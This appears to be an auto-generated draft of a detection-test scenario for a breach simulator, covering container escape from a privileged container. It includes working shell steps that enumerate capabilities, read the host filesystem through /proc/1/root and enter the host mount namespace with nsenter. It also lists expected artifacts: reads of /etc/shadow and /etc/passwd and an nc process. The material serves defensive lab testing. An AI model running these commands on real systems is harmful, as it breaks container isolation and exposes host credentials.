identity.name: Container Escape via Privileged Mode
identity.summary: Auto-generated draft from CortexSim scenario SIM-CDR-003. Plane: CDR. Primary technique: T1611. Requires human enrichment of BIOC logic + panw_mapping rule_ids.
identity.description:
Auto-generated draft from CortexSim scenario SIM-CDR-003. Plane: CDR. Primary technique: T1611. Requires human enrichment of BIOC logic + panw_mapping rule_ids.

Source scenario: SIM-CDR-003.
UC: Container Escape Attempt Detection / TC: Privileged Container Escape via nsenter.

prerequisites.description: Lab environment matching scenario SIM-CDR-003 requirements.

payload.code:
# step-1: Verify privileged container mode and enumerate escape preconditions
echo '[*] Checking container privileges...' && \
cat /proc/self/status | grep -E 'CapEff|CapPrm|CapBnd' && \
echo '---' && \
ls /dev/sda 2>/dev/null && echo '[!] Block device /dev/sda accessible — privileged mode confirmed' || echo '[-] /dev/sda not accessible'; \
cat /proc/1/cgroup | head -5 && \
echo '[*] Privilege check complete'
# step-2: Enumerate host filesystem via /proc/1 namespace links
echo '[*] Enumerating host filesystem via PID 1 namespace...' && \
ls -la /proc/1/root/ 2>/dev/null | head -20 && \
echo '---' && \
ls /proc/1/root/etc/ 2>/dev/null | head -20 && \
cat /proc/1/root/etc/os-release 2>/dev/null && \
echo '[*] Host filesystem enumeration complete'
# step-3: Use nsenter to break into host mount namespace
which nsenter && echo '[*] nsenter available — attempting host namespace entry' || (apt-get install -y util-linux -qq 2>/dev/null || apk add --no-cache util-linux 2>/dev/null); \
nsenter --mount=/proc/1/ns/mnt -- ls /etc/ 2>&1 | head -20 && \
echo '[*] Successfully entered host mount namespace' || echo '[!] nsenter attempt failed — container may not be privileged'

expected_artifacts.description: File access pattern matching '/etc/shadow' (Linux credential file) (heuristic from scenario step step-04)
File access pattern matching '/etc/passwd' (Linux account database) (heuristic from scenario step step-04)
Process execution matching nc (heuristic from scenario step step-05)

cleanup.code:
nsenter --mount=/proc/1/ns/mnt -- rm -f /etc/cron.d/cortexsim-sim /tmp/cortexsim_escape_proof.txt 2>/dev/null || true
rm -f /tmp/deepce.sh
echo '[CortexSim] SIM-CDR-003 cleanup complete'
